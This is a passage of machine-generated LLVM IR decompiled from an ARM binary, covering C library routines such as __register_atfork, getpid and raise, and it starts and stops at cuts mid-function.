  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14004), i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1d950

dec_label_pc_1d950:                               ; preds = %dec_label_pc_1d984.dec_label_pc_1d950_crit_edge, %entry
  %v0_1d954 = phi i32 [ %v0_1d954.pre, %dec_label_pc_1d984.dec_label_pc_1d950_crit_edge ], [ %v0_1d948, %entry ]
  %v1_1d950 = phi i32 [ %v1_1d950.pre, %dec_label_pc_1d984.dec_label_pc_1d950_crit_edge ], [ 14004, %entry ]
  %v0_1d950 = phi i32 [ %v0_1d950.pre, %dec_label_pc_1d984.dec_label_pc_1d950_crit_edge ], [ ptrtoint (i32* @global_var_2c010.418 to i32), %entry ]
  %v2_1d950 = add i32 %v0_1d950, %v1_1d950
  %v3_1d950 = inttoptr i32 %v2_1d950 to i32*
  %v4_1d950 = load i32, i32* %v3_1d950, align 4
  store i32 %v4_1d950, i32* %r4.global-to-local, align 4
  %v2_1d958 = inttoptr i32 %v0_1d954 to i32*
  store i32 %v4_1d950, i32* %v2_1d958, align 4
  %v0_1d95c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1d95c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d960

dec_label_pc_1d960:                               ; preds = %dec_label_pc_1d96c.dec_label_pc_1d960_crit_edge, %dec_label_pc_1d950
  %v0_1d960 = phi i32 [ %v0_1d960.pre, %dec_label_pc_1d96c.dec_label_pc_1d960_crit_edge ], [ %v0_1d95c, %dec_label_pc_1d950 ]
  %v1_1d960 = inttoptr i32 %v0_1d960 to i32*
  %v2_1d960 = load i32, i32* %v1_1d960, align 4
  %v1_1d964 = load i32, i32* %r4.global-to-local, align 4
  %v3_1d964 = icmp uge i32 %v2_1d960, %v1_1d964
  store i1 %v3_1d964, i1* %cpsr_c.global-to-local, align 1
  %v9_1d964 = icmp eq i32 %v2_1d960, %v1_1d964
  br i1 %v9_1d964, label %dec_label_pc_1d96c, label %dec_label_pc_1d984

dec_label_pc_1d96c:                               ; preds = %dec_label_pc_1d960
  store i32 %v2_1d960, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d97c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d97c, label %dec_label_pc_1d980, label %dec_label_pc_1d96c.dec_label_pc_1d960_crit_edge

dec_label_pc_1d96c.dec_label_pc_1d960_crit_edge:  ; preds = %dec_label_pc_1d96c
  %v0_1d960.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d960

dec_label_pc_1d980:                               ; preds = %dec_label_pc_1d96c
  %v0_1d980 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1d984

dec_label_pc_1d984:                               ; preds = %dec_label_pc_1d960, %dec_label_pc_1d980
  %v0_1d984 = phi i32 [ %v0_1d980, %dec_label_pc_1d980 ], [ %v2_1d960, %dec_label_pc_1d960 ]
  %v1_1d984 = phi i32 [ %v0_1d980, %dec_label_pc_1d980 ], [ %v1_1d964, %dec_label_pc_1d960 ]
  %v3_1d984 = icmp uge i32 %v0_1d984, %v1_1d984
  store i1 %v3_1d984, i1* %cpsr_c.global-to-local, align 1
  %v9_1d984 = icmp eq i32 %v0_1d984, %v1_1d984
  br i1 %v9_1d984, label %dec_label_pc_1d98c, label %dec_label_pc_1d984.dec_label_pc_1d950_crit_edge

dec_label_pc_1d984.dec_label_pc_1d950_crit_edge:  ; preds = %dec_label_pc_1d984
  %v0_1d950.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1d950.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1d954.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1d950

dec_label_pc_1d98c:                               ; preds = %dec_label_pc_1d984
  %v2_1d98c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1d98c, i32* %r4.global-to-local, align 4
  %v1_1d990 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1d990

; uselistorder directives
  uselistorder i32 %v0_1d980, { 1, 0 }
  uselistorder i32 %v1_1d964, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14004), { 1, 0 }
  uselistorder i32 14004, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1d984, { 1, 0 }
}

define i32 @__GI___register_atfork(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_1d99c = load i32, i32* @r4, align 4
  %v12_1d99c = load i32, i32* @r7, align 4
  %v15_1d99c = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 680), i32* @r5, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @fp, align 4
  %v0_1d9bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d9bc, i32* @r8, align 4
  store i32 %arg4, i32* @sl, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 680), i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_1d9d072 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 680) to i32*), align 4
  store i32 %v2_1d9d072, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1d9d474 = icmp eq i32 %v2_1d9d072, 0
  br i1 %v9_1d9d474, label %dec_label_pc_1d9dc, label %dec_label_pc_1d9f4

dec_label_pc_1d9dc:                               ; preds = %entry, %dec_label_pc_1d9dc.dec_label_pc_1d9d0_crit_edge
  %v0_1d9dc75 = phi i32 [ %v1_1d9d4.pre, %dec_label_pc_1d9dc.dec_label_pc_1d9d0_crit_edge ], [ 0, %entry ]
  store i32 %v0_1d9dc75, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d9ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d9ec, label %dec_label_pc_1d9f0, label %dec_label_pc_1d9dc.dec_label_pc_1d9d0_crit_edge

dec_label_pc_1d9dc.dec_label_pc_1d9d0_crit_edge:  ; preds = %dec_label_pc_1d9dc
  %v0_1d9d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1d9d4.pre = load i32, i32* @r4, align 4
  %v1_1d9d0 = inttoptr i32 %v0_1d9d0.pre to i32*
  %v2_1d9d0 = load i32, i32* %v1_1d9d0, align 4
  store i32 %v2_1d9d0, i32* %r3.global-to-local, align 4
  %v3_1d9d4 = icmp uge i32 %v2_1d9d0, %v1_1d9d4.pre
  store i1 %v3_1d9d4, i1* %cpsr_c.global-to-local, align 1
  %v9_1d9d4 = icmp eq i32 %v2_1d9d0, %v1_1d9d4.pre
  br i1 %v9_1d9d4, label %dec_label_pc_1d9dc, label %dec_label_pc_1d9f4

dec_label_pc_1d9f0:                               ; preds = %dec_label_pc_1d9dc
  %v0_1d9f0 = load i32, i32* @r4, align 4
  store i32 %v0_1d9f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d9f4

dec_label_pc_1d9f4:                               ; preds = %entry, %dec_label_pc_1d9dc.dec_label_pc_1d9d0_crit_edge, %dec_label_pc_1d9f0
  %v0_1d9f4 = phi i32 [ %v0_1d9f0, %dec_label_pc_1d9f0 ], [ %v2_1d9d072, %entry ], [ %v2_1d9d0, %dec_label_pc_1d9dc.dec_label_pc_1d9d0_crit_edge ]
  %v1_1d9f4 = phi i32 [ %v0_1d9f0, %dec_label_pc_1d9f0 ], [ 0, %entry ], [ %v1_1d9d4.pre, %dec_label_pc_1d9dc.dec_label_pc_1d9d0_crit_edge ]
  %v3_1d9f4 = icmp uge i32 %v0_1d9f4, %v1_1d9f4
  store i1 %v3_1d9f4, i1* %cpsr_c.global-to-local, align 1
  %v9_1d9f4 = icmp eq i32 %v0_1d9f4, %v1_1d9f4
  br i1 %v9_1d9f4, label %bb48, label %bb

bb:                                               ; preds = %dec_label_pc_1d9f4
  %v1_1d9f8 = load i32, i32* @r5, align 4
  store i32 %v1_1d9f8, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1d9f4, %bb
  store i32 121344, i32* @lr, align 4
  %v1_1d9fc = xor i1 %v9_1d9f4, true
  call void @__pseudo_cond_branch(i1 %v1_1d9fc, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  store i32 684, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_1da08 = load i32, i32* @r6, align 4
  %v2_1da08 = add i32 %v0_1da08, 684
  %v0_1da0c.pre = load i32, i32* @r4, align 4
  %tmp49 = icmp ult i32 %v0_1da0c.pre, 48
  br label %dec_label_pc_1da0c

dec_label_pc_1da0c:                               ; preds = %dec_label_pc_1da30, %bb48
  %v0_1da30 = phi i32 [ %v2_1da30, %dec_label_pc_1da30 ], [ %v2_1da08, %bb48 ]
  store i32 %v0_1da0c.pre, i32* %r2.global-to-local, align 4
  br i1 %tmp49, label %dec_label_pc_1da14, label %dec_label_pc_1da30

dec_label_pc_1da14:                               ; preds = %dec_label_pc_1da0c, %dec_label_pc_1da24
  %v0_1da24 = phi i32 [ %v1_1da24, %dec_label_pc_1da24 ], [ %v0_1da0c.pre, %dec_label_pc_1da0c ]
  %v3_1da14 = mul i32 %v0_1da24, 28
  %v4_1da14 = add i32 %v3_1da14, %v0_1da30
  store i32 %v4_1da14, i32* %r3.global-to-local, align 4
  %v1_1da18 = add i32 %v4_1da14, 24
  %v2_1da18 = inttoptr i32 %v1_1da18 to i32*
  %v3_1da18 = load i32, i32* %v2_1da18, align 4
  store i32 %v3_1da18, i32* %r3.global-to-local, align 4
  %v2_1da1c = icmp eq i32 %v3_1da18, 0
  br i1 %v2_1da1c, label %dec_label_pc_1da6c.loopexit, label %dec_label_pc_1da24

dec_label_pc_1da24:                               ; preds = %dec_label_pc_1da14
  %v1_1da24 = add nuw nsw i32 %v0_1da24, 1
  store i32 %v1_1da24, i32* %r2.global-to-local, align 4
  %tmp50 = icmp ult i32 %v1_1da24, 48
  br i1 %tmp50, label %dec_label_pc_1da14, label %dec_label_pc_1da30

dec_label_pc_1da30:                               ; preds = %dec_label_pc_1da24, %dec_label_pc_1da0c
  %v1_1da30 = inttoptr i32 %v0_1da30 to i32*
  %v2_1da30 = load i32, i32* %v1_1da30, align 4
  store i32 %v2_1da30, i32* @r7, align 4
  %v2_1da34 = icmp eq i32 %v2_1da30, 0
  br i1 %v2_1da34, label %dec_label_pc_1da3c, label %dec_label_pc_1da0c

dec_label_pc_1da3c:                               ; preds = %dec_label_pc_1da30
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1348, i32* %r1.global-to-local, align 4
  %v2_1da44 = call i32 @calloc(i32 1, i32 1348)
  store i32 %v2_1da44, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1da48 = icmp eq i32 %v2_1da44, 0
  br i1 %v2_1da48, label %bb51, label %dec_label_pc_1da54

bb51:                                             ; preds = %dec_label_pc_1da3c
  %v1_1da4c = load i32, i32* @r7, align 4
  store i32 %v1_1da4c, i32* @r5, align 4
  br label %dec_label_pc_1da9c

dec_label_pc_1da54:                               ; preds = %dec_label_pc_1da3c
  store i32 684, i32* %r2.global-to-local, align 4
  %v0_1da58 = load i32, i32* @r6, align 4
  %v2_1da58 = add i32 %v0_1da58, 684
  %v3_1da58 = inttoptr i32 %v2_1da58 to i32*
  %v4_1da58 = load i32, i32* %v3_1da58, align 4
  store i32 %v4_1da58, i32* %r3.global-to-local, align 4
  store i32 %v2_1da44, i32* @r7, align 4
  %v2_1da60 = inttoptr i32 %v2_1da44 to i32*
  store i32 %v4_1da58, i32* %v2_1da60, align 4
  %v0_1da64 = load i32, i32* %r0.global-to-local, align 4
  %v1_1da64 = load i32, i32* @r6, align 4
  %v2_1da64 = load i32, i32* %r2.global-to-local, align 4
  %v3_1da64 = add i32 %v2_1da64, %v1_1da64
  %v4_1da64 = inttoptr i32 %v3_1da64 to i32*
  store i32 %v0_1da64, i32* %v4_1da64, align 4
  store i32 47, i32* %r2.global-to-local, align 4
  %v2_1da70.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1da6c

dec_label_pc_1da6c.loopexit:                      ; preds = %dec_label_pc_1da14
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1da6c

dec_label_pc_1da6c:                               ; preds = %dec_label_pc_1da6c.loopexit, %dec_label_pc_1da54
  %v2_1da70 = phi i32 [ %v0_1da30, %dec_label_pc_1da6c.loopexit ], [ %v2_1da70.pre, %dec_label_pc_1da54 ]
  %v0_1da70 = phi i32 [ %v0_1da24, %dec_label_pc_1da6c.loopexit ], [ 47, %dec_label_pc_1da54 ]
  %v3_1da70 = mul i32 %v0_1da70, 28
  %v4_1da70 = add i32 %v3_1da70, %v2_1da70
  store i32 %v4_1da70, i32* %r3.global-to-local, align 4
  %v2_1da78 = add i32 %v4_1da70, 24
  %v3_1da78 = inttoptr i32 %v2_1da78 to i32*
  store i32 1, i32* %v3_1da78, align 4
  %v0_1da7c = load i32, i32* %r3.global-to-local, align 4
  %v1_1da7c = add i32 %v0_1da7c, 4
  store i32 %v1_1da7c, i32* @r5, align 4
  %v2_1da7c = icmp ugt i32 %v0_1da7c, -5
  store i1 %v2_1da7c, i1* %cpsr_c.global-to-local, align 1
  %v7_1da7c = icmp eq i32 %v1_1da7c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1da84 = add i32 %v0_1da7c, 28
  %v3_1da84 = inttoptr i32 %v2_1da84 to i32*
  store i32 0, i32* %v3_1da84, align 4
  br i1 %v7_1da7c, label %dec_label_pc_1da9c, label %dec_label_pc_1da8c

dec_label_pc_1da8c:                               ; preds = %dec_label_pc_1da6c
  %v0_1da8c = load i32, i32* @r5, align 4
  %v1_1da8c = add i32 %v0_1da8c, 4
  %v2_1da8c = inttoptr i32 %v1_1da8c to i32*
  %v3_1da8c = load i32, i32* @r8, align 4
  store i32 %v3_1da8c, i32* %v2_1da8c, align 4
  %v4_1da8c = add i32 %v0_1da8c, 8
  %v5_1da8c = inttoptr i32 %v4_1da8c to i32*
  %v6_1da8c = load i32, i32* @sb, align 4
  store i32 %v6_1da8c, i32* %v5_1da8c, align 4
  %v7_1da8c = add i32 %v0_1da8c, 12
  %v8_1da8c = inttoptr i32 %v7_1da8c to i32*
  %v9_1da8c = load i32, i32* @fp, align 4
  store i32 %v9_1da8c, i32* %v8_1da8c, align 4
  %v0_1da90 = load i32, i32* @sl, align 4
  %v1_1da90 = load i32, i32* @r5, align 4
  %v2_1da90 = add i32 %v1_1da90, 16
  %v3_1da90 = inttoptr i32 %v2_1da90 to i32*
  store i32 %v0_1da90, i32* %v3_1da90, align 4
  %v0_1da94 = load i32, i32* @r5, align 4
  store i32 %v0_1da94, i32* %r0.global-to-local, align 4
  %v1_1da98 = inttoptr i32 %v0_1da94 to i32*
  %v2_1da98 = call i32 @__linkin_atfork(i32* %v1_1da98)
  store i32 %v2_1da98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1da9c

dec_label_pc_1da9c:                               ; preds = %bb51, %dec_label_pc_1da6c, %dec_label_pc_1da8c
  store i32 680, i32* %r7.global-to-local, align 4
  %v0_1daa0 = load i32, i32* @r6, align 4
  %v2_1daa0 = add i32 %v0_1daa0, 680
  store i32 %v2_1daa0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1daa4

dec_label_pc_1daa4:                               ; preds = %dec_label_pc_1dad4.dec_label_pc_1daa4_crit_edge, %dec_label_pc_1da9c
  %v0_1daac = phi i32 [ %v0_1daac.pre, %dec_label_pc_1dad4.dec_label_pc_1daa4_crit_edge ], [ %v2_1daa0, %dec_label_pc_1da9c ]
  %v1_1daa4 = phi i32 [ %v1_1daa4.pre, %dec_label_pc_1dad4.dec_label_pc_1daa4_crit_edge ], [ 680, %dec_label_pc_1da9c ]
  %v0_1daa4 = phi i32 [ %v0_1daa4.pre, %dec_label_pc_1dad4.dec_label_pc_1daa4_crit_edge ], [ %v0_1daa0, %dec_label_pc_1da9c ]
  %v2_1daa4 = add i32 %v0_1daa4, %v1_1daa4
  %v3_1daa4 = inttoptr i32 %v2_1daa4 to i32*
  %v4_1daa4 = load i32, i32* %v3_1daa4, align 4
  store i32 %v4_1daa4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1daac, i32* %r2.global-to-local, align 4
  %v1_1dab060 = inttoptr i32 %v0_1daac to i32*
  %v2_1dab061 = load i32, i32* %v1_1dab060, align 4
  store i32 %v2_1dab061, i32* %r3.global-to-local, align 4
  %v3_1dab463 = icmp uge i32 %v2_1dab061, %v4_1daa4
  store i1 %v3_1dab463, i1* %cpsr_c.global-to-local, align 1
  %v9_1dab469 = icmp eq i32 %v2_1dab061, %v4_1daa4
  br i1 %v9_1dab469, label %dec_label_pc_1dabc, label %dec_label_pc_1dad4

dec_label_pc_1dabc:                               ; preds = %dec_label_pc_1daa4, %dec_label_pc_1dabc.dec_label_pc_1dab0_crit_edge
  %v0_1dabc70 = phi i32 [ %v1_1dab4.pre, %dec_label_pc_1dabc.dec_label_pc_1dab0_crit_edge ], [ %v4_1daa4, %dec_label_pc_1daa4 ]
  store i32 %v0_1dabc70, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1dacc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1dacc, label %dec_label_pc_1dad0, label %dec_label_pc_1dabc.dec_label_pc_1dab0_crit_edge

dec_label_pc_1dabc.dec_label_pc_1dab0_crit_edge:  ; preds = %dec_label_pc_1dabc
  %v0_1dab0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1dab4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1dab0 = inttoptr i32 %v0_1dab0.pre to i32*
  %v2_1dab0 = load i32, i32* %v1_1dab0, align 4
  store i32 %v2_1dab0, i32* %r3.global-to-local, align 4
  %v3_1dab4 = icmp uge i32 %v2_1dab0, %v1_1dab4.pre
  store i1 %v3_1dab4, i1* %cpsr_c.global-to-local, align 1
  %v9_1dab4 = icmp eq i32 %v2_1dab0, %v1_1dab4.pre
  br i1 %v9_1dab4, label %dec_label_pc_1dabc, label %dec_label_pc_1dad4

dec_label_pc_1dad0:                               ; preds = %dec_label_pc_1dabc
  %v0_1dad0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1dad0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1dad4

dec_label_pc_1dad4:                               ; preds = %dec_label_pc_1daa4, %dec_label_pc_1dabc.dec_label_pc_1dab0_crit_edge, %dec_label_pc_1dad0
  %v0_1dadc = phi i32 [ %v0_1dad0, %dec_label_pc_1dad0 ], [ %v2_1dab061, %dec_label_pc_1daa4 ], [ %v2_1dab0, %dec_label_pc_1dabc.dec_label_pc_1dab0_crit_edge ]
  %v1_1dad4 = phi i32 [ %v0_1dad0, %dec_label_pc_1dad0 ], [ %v4_1daa4, %dec_label_pc_1daa4 ], [ %v1_1dab4.pre, %dec_label_pc_1dabc.dec_label_pc_1dab0_crit_edge ]
  %v3_1dad4 = icmp uge i32 %v0_1dadc, %v1_1dad4
  store i1 %v3_1dad4, i1* %cpsr_c.global-to-local, align 1
  %v9_1dad4 = icmp eq i32 %v0_1dadc, %v1_1dad4
  br i1 %v9_1dad4, label %dec_label_pc_1dadc, label %dec_label_pc_1dad4.dec_label_pc_1daa4_crit_edge

dec_label_pc_1dad4.dec_label_pc_1daa4_crit_edge:  ; preds = %dec_label_pc_1dad4
  %v0_1daa4.pre = load i32, i32* @r6, align 4
  %v1_1daa4.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1daac.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1daa4

dec_label_pc_1dadc:                               ; preds = %dec_label_pc_1dad4
  %v2_1dadc = icmp ne i32 %v1_1dad4, 0
  store i1 %v2_1dadc, i1* %cpsr_c.global-to-local, align 1
  %v7_1dae0 = icmp slt i32 %v1_1dad4, 2
  br i1 %v7_1dae0, label %dec_label_pc_1dafc, label %dec_label_pc_1dae4

dec_label_pc_1dae4:                               ; preds = %dec_label_pc_1dadc
  %v0_1dae4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1dae4, i32* %r0.global-to-local, align 4
  %v0_1dae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dae8 = add i32 %v0_1dae8, 129
  store i32 %v1_1dae8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1dafc

dec_label_pc_1dafc:                               ; preds = %dec_label_pc_1dae4, %dec_label_pc_1dadc
  %v0_1dafc = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1dafc = icmp eq i32 %v0_1dafc, 0
  %. = select i1 %v2_1dafc, i32 12, i32 0
  store i32 %., i32* %r0.global-to-local, align 4
  store i32 %v3_1d99c, i32* %r4.global-to-local, align 4
  store i32 %v12_1d99c, i32* %r7.global-to-local, align 4
  store i32 %v15_1d99c, i32* %r8.global-to-local, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v0_1dad0, { 1, 0, 2 }
  uselistorder i32 %v1_1dab4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1da44, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1da30, { 1, 2, 0 }
  uselistorder i32 %v1_1da24, { 1, 2, 0 }
  uselistorder i32 %v0_1da24, { 0, 2, 1 }
  uselistorder i32 %v0_1da30, { 0, 2, 1 }
  uselistorder i32 %v0_1da0c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1d9f0, { 1, 0, 2 }
  uselistorder i32 %v1_1d9d4.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 14, 5, 6, 7, 8, 9, 10, 11, 13, 12, 15, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 2, 3, 5, 4, 9, 10, 6, 7, 8, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 8, 9, 4, 12, 5, 13, 6, 7, 10, 11 }
  uselistorder i32 684, { 0, 2, 1, 3 }
  uselistorder i32 680, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1dad4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1dabc, { 1, 0 }
  uselistorder label %dec_label_pc_1da9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1da14, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1d9f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d9dc, { 1, 0 }
}

define i32 @function_1db18(i32 %arg1) local_unnamed_addr {
dec_label_pc_1db18:
  %v0_1db18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1db18, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1db18
  %v2_1db18 = load i32, i32* @r8, align 4
  %v5_1db18 = udiv i32 %v2_1db18, 32
  %v6_1db18 = and i32 %v5_1db18, %arg1
  %v2_1db1c = load i32, i32* @ip, align 4
  %v5_1db1c = udiv i32 %v2_1db1c, 32
  %v6_1db1c = and i32 %v6_1db18, %v5_1db1c
  %v2_1db20 = load i32, i32* @r4, align 4
  %v5_1db20 = sdiv i32 %v2_1db20, 1024
  %v6_1db20 = and i32 %v6_1db1c, %v5_1db20
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1db18, %bb
  %v7_1db20 = phi i32 [ %arg1, %dec_label_pc_1db18 ], [ %v6_1db20, %bb ]
  ret i32 %v7_1db20

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__getpid() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1db24 = load i32, i32* @r7, align 4
  store i32 %v3_1db24, i32* %stack_var_-8, align 4
  %v0_1db28 = call i32 @__aeabi_read_tp()
  store i32 %v0_1db28, i32* %r0.global-to-local, align 4
  %v1_1db2c = add i32 %v0_1db28, -1060
  %v2_1db2c = inttoptr i32 %v1_1db2c to i32*
  %v3_1db2c = load i32, i32* %v2_1db2c, align 4
  %tmp7 = icmp slt i32 %v3_1db2c, 1
  br i1 %tmp7, label %dec_label_pc_1db3c, label %dec_label_pc_1db60

dec_label_pc_1db3c:                               ; preds = %entry
  %v2_1db30 = icmp eq i32 %v3_1db2c, 0
  br i1 %v2_1db30, label %dec_label_pc_1db40, label %dec_label_pc_1db4c

dec_label_pc_1db40:                               ; preds = %dec_label_pc_1db3c
  %v1_1db40 = add i32 %v0_1db28, -1064
  %v2_1db40 = inttoptr i32 %v1_1db40 to i32*
  %v3_1db40 = load i32, i32* %v2_1db40, align 4
  store i32 %v3_1db40, i32* %r0.global-to-local, align 4
  %v2_1db44 = icmp eq i32 %v3_1db40, 0
  br i1 %v2_1db44, label %bb, label %bb8

dec_label_pc_1db4c:                               ; preds = %dec_label_pc_1db3c
  br label %bb8

bb:                                               ; preds = %dec_label_pc_1db40
  store i32 0, i32* %v2_1db40, align 4
  %v0_1db5c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1db4c, %dec_label_pc_1db40, %bb
  %v0_1db5c = phi i32 [ %v3_1db40, %dec_label_pc_1db40 ], [ %v0_1db28, %dec_label_pc_1db4c ], [ %v0_1db5c.pre, %bb ]
  br label %dec_label_pc_1db60

dec_label_pc_1db60:                               ; preds = %entry, %bb8
  %v0_1db60 = phi i32 [ %v3_1db2c, %entry ], [ %v0_1db5c, %bb8 ]
  store i32 %v0_1db60, i32* %r0.global-to-local, align 4
  %v2_1db64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1db64, i32* @r7, align 4
  ret i32 %v0_1db60

; uselistorder directives
  uselistorder i32 %v0_1db60, { 1, 0 }
  uselistorder i32 %v3_1db2c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1db60, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1db6c = load i32, i32* @r4, align 4
  store i32 %v3_1db6c, i32* %stack_var_-20, align 4
  %v0_1db74 = call i32 @__aeabi_read_tp()
  store i32 %v0_1db74, i32* %r0.global-to-local, align 4
  %v1_1db78 = add i32 %v0_1db74, -1064
  %v2_1db78 = inttoptr i32 %v1_1db78 to i32*
  %v3_1db78 = load i32, i32* %v2_1db78, align 4
  store i32 %v3_1db78, i32* %r4.global-to-local, align 4
  %v2_1db7c = icmp eq i32 %v3_1db78, 0
  %v1_1db84 = add i32 %v0_1db74, -1060
  %v2_1db84 = inttoptr i32 %v1_1db84 to i32*
  %v3_1db84 = load i32, i32* %v2_1db84, align 4
  store i32 %v3_1db84, i32* %r0.global-to-local, align 4
  br i1 %v2_1db7c, label %dec_label_pc_1db8c, label %dec_label_pc_1dba0

dec_label_pc_1db8c:                               ; preds = %entry
  store i32 %v3_1db84, i32* %r4.global-to-local, align 4
  store i32 %v3_1db84, i32* %v2_1db78, align 4
  %v0_1dbc8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_1dba0:                               ; preds = %entry
  %v5_1dba4 = icmp sgt i32 %v3_1db84, 0
  br i1 %v5_1dba4, label %bb28, label %dec_label_pc_1dba8

dec_label_pc_1dba8:                               ; preds = %dec_label_pc_1dba0
  %tmp = bitcast i32 %v3_1db84 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_1dba8 = bitcast float %tmp30 to i32
  %v2_1dbac = icmp eq i32 %v1_1dba8, 0
  br i1 %v2_1dbac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1dba8
  store i32 %v3_1db78, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_1dba8
  %v2_1dbb4 = sub i32 0, %v3_1db84
  store i32 %v2_1dbb4, i32* %r0.global-to-local, align 4
  br label %bb28

